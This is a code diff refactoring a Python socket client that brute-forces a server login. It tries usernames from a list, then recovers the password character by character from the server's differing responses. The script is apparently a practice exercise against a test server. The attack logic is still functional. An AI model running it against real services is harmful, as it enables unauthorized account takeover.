@@ -16,8 +16,14 @@ SUCCESS = {'result': 'Connection success!'}
 
 
 class Credentials(dict):
-    def __init__(self, login: str, password: str):
+    def __init__(self, login: str | None, password: str | None):
         super().__init__(login=login, password=password)
+
+    def update_login(self, new_login: str):
+        self['login'] = new_login
+
+    def update_password(self, new_password: str):
+        self['password'] = new_password
 
     def to_json(self, indent=None):
         return dumps(self, indent=indent)
@@ -39,24 +45,25 @@ def get_logins():
 
 
 def brute_force_login(client):
+    credentials = Credentials(None, ' ')
+
     for login in get_logins():
-        credentials = Credentials(login, ' ')
+        credentials.update_login(login)
 
         client.send(credentials.to_json().encode())
         response = client.recv(1024).decode()
         response = loads(response)
 
         if response == WRONG_PASSWORD:
-            return login
+            return credentials
 
 
-def brute_force_password(client, login):
+def brute_force_password(client, credentials):
     password = []
     found = False
     while not found:
         for character in ALPHABET:
-            candidate = ''.join(password) + character
-            credentials = Credentials(login, candidate)
+            credentials.update_password(''.join(password) + character)
 
             client.send(credentials.to_json().encode())
             response = client.recv(1024).decode()
@@ -66,7 +73,7 @@ def brute_force_password(client, login):
                 password.append(character)
                 break
             elif response == SUCCESS:
-                return candidate
+                return credentials
 
 
 def main():
@@ -75,11 +82,10 @@ def main():
     with socket() as client:
         client.connect(address)
 
-        login = brute_force_login(client)
-        password = brute_force_password(client, login)
+        creds = brute_force_login(client)
+        creds = brute_force_password(client, creds)
 
-    credentials = Credentials(login, password)
-    print(credentials.to_json())
+    print(creds.to_json())
 
 
 if __name__ == "__main__":
